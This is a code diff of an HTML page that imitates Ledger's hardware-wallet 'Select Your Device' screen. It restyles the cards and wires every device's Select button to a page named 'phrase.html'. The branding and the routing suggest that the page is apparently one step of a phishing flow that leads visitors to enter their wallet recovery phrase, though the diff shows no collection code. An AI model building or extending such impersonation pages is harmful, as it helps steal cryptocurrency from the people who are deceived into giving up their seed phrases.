@@ -3,11 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ledger Devices</title>
+  <title>Select Your Device - Ledger</title>
   <style>
     body {
-      background-color: #0d0c0c;
-      color: white;
+      background-color: #111;
+      color: #fff;
       font-family: 'Courier New', monospace;
       text-align: center;
       margin: 0;
@@ -15,108 +15,102 @@
     }
 
     h1 {
-      margin-top: 60px;
+      margin-top: 50px;
+      font-size: 28px;
       letter-spacing: 2px;
     }
 
     .devices {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 30px;
-      justify-items: center;
-      padding: 60px 8%;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-top: 40px;
+      gap: 20px;
     }
 
-    .device {
-      background-color: #1a1a1a;
-      border-radius: 18px;
-      padding: 40px 20px;
-      width: 100%;
-      max-width: 260px;
+    .device-card {
+      background-color: #1c1c1c;
+      padding: 30px;
+      border-radius: 12px;
+      width: 250px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
       transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
 
-    .device:hover {
-      transform: translateY(-10px);
-      box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.15);
+    .device-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
     }
 
-    .device img {
-      width: 120px;
-      height: 160px;
-      object-fit: contain;
+    .device-card img {
+      width: 100px;
+      height: auto;
       margin-bottom: 20px;
     }
 
-    .device h2 {
-      font-size: 16px;
+    .device-card h3 {
       margin-bottom: 15px;
+      font-size: 18px;
     }
 
     button {
-      background-color: white;
-      color: black;
+      background-color: #fff;
+      color: #000;
       border: none;
-      border-radius: 30px;
-      padding: 8px 26px;
+      padding: 10px 25px;
+      border-radius: 25px;
       font-weight: bold;
       cursor: pointer;
-      font-family: inherit;
+      transition: background 0.3s ease;
     }
 
     button:hover {
-      background-color: #ccc;
+      background-color: #9b9bff;
     }
 
     .back {
       position: absolute;
       top: 20px;
       left: 30px;
-      color: white;
+      color: #ccc;
       text-decoration: none;
       font-size: 14px;
     }
 
     .back:hover {
-      text-decoration: underline;
-    }
-
-    @media (max-width: 768px) {
-      .device img {
-        width: 100px;
-        height: 140px;
-      }
+      color: #fff;
     }
   </style>
 </head>
 <body>
 
-  <a href="index.html" class="back">← Previous</a>
+  <a href="#" class="back">← Previous</a>
+
   <h1>[ LEDGER ]<br>SELECT YOUR DEVICE</h1>
 
   <div class="devices">
-    <div class="device">
-      <img src="one1.png" alt="Ledger Stax">
-      <h2>Ledger Stax</h2>
-      <button>Select</button>
+    <div class="device-card">
+      <img src="stax.png" alt="Ledger Stax" />
+      <h3>Ledger Stax</h3>
+      <button onclick="window.location.href='phrase.html'">Select</button>
     </div>
 
-    <div class="device">
-      <img src="flex_3x.png" alt="Ledger Flex">
-      <h2>Ledger Flex</h2>
-      <button>Select</button>
+    <div class="device-card">
+      <img src="flex.png" alt="Ledger Flex" />
+      <h3>Ledger Flex</h3>
+      <button onclick="window.location.href='phrase.html'">Select</button>
     </div>
 
-    <div class="device">
-      <img src="three123.png" alt="Ledger Nano S & Plus">
-      <h2>Ledger Nano S & Plus</h2>
-      <button>Select</button>
+    <div class="device-card">
+      <img src="nano-s-plus.png" alt="Ledger Nano S Plus" />
+      <h3>Ledger Nano S & Plus</h3>
+      <button onclick="window.location.href='phrase.html'">Select</button>
     </div>
 
-    <div class="device">
-      <img src="four123.png" alt="Ledger Nano X">
-      <h2>Ledger Nano X</h2>
-      <button>Select</button>
+    <div class="device-card">
+      <img src="nano-x.png" alt="Ledger Nano X" />
+      <h3>Ledger Nano X</h3>
+      <button onclick="window.location.href='phrase.html'">Select</button>
     </div>
   </div>
 
